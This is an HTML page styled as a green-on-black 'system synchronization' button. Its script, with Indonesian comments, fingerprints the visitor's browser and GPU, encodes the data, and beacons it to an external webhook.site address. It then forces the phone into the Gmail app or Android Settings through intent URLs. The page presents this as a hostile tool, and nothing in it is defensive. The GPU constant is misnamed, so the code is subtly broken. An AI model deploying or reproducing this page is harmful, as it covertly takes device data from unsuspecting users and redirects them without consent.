<!DOCTYPE html>
<html>
<head><title>System Synchronization</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
    <div id="ignite" style="padding:50px;border:2px solid #0f0;text-align:center;cursor:pointer;box-shadow:0 0 40px #0f0">
        <h1 style="margin:0 0 20px 0">V202_NATIVE_JUMP</h1>
        <div id="status">TRIGGER_APP_TRANSITION</div>
    </div>

<script>
    const target = "https://webhook.site/6a675816-997e-434a-be92-332fe00e3d9b";

    document.getElementById('ignite').onclick = async () => {
        // 1. COLLECT SENSITIVE HARDWARE DATA
        const vault = {
            id: "V202_NATIVE",
            ua: navigator.userAgent,
            gpu: (() => {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ADDR) : "HIDDEN";
            })()
        };

        // 2. EXFILTRATE DATA (Kirim sebelum lompat)
        navigator.sendBeacon(`${target}?v=V202_READY`, btoa(JSON.stringify(vault)));

        // 3. THE NATIVE APP JUMP (GMAIL APP, BUKAN BROWSER)
        // Kita menggunakan format Intent Android yang memanggil package com.google.android.gm
        const nativeGmailIntent = 
            "intent:#Intent;" +
            "action=android.intent.action.MAIN;" + 
            "category=android.intent.category.APP_EMAIL;" +
            "package=com.google.android.gm;" + // Target aplikasi Gmail asli
            "S.browser_fallback_url=https://google.com;" + // Jika gagal, lempar ke google
            "end";

        // 4. EXECUTE THE LEAP
        document.getElementById('status').innerText = "OPENING_NATIVE_GMAIL_APP...";
        
        setTimeout(() => {
            // Ini akan memicu Android System Intent Picker atau langsung buka Gmail
            window.location.href = nativeGmailIntent;
            
            // Link cadangan jika Intent pertama diblokir oleh interaksi user
            setTimeout(() => {
                // Mencoba masuk ke Settings Android jika Gmail gagal
                window.location.href = "intent:#Intent;action=android.settings.SETTINGS;end";
            }, 1000);
        }, 500);
    };
</script>
</body>
</html>
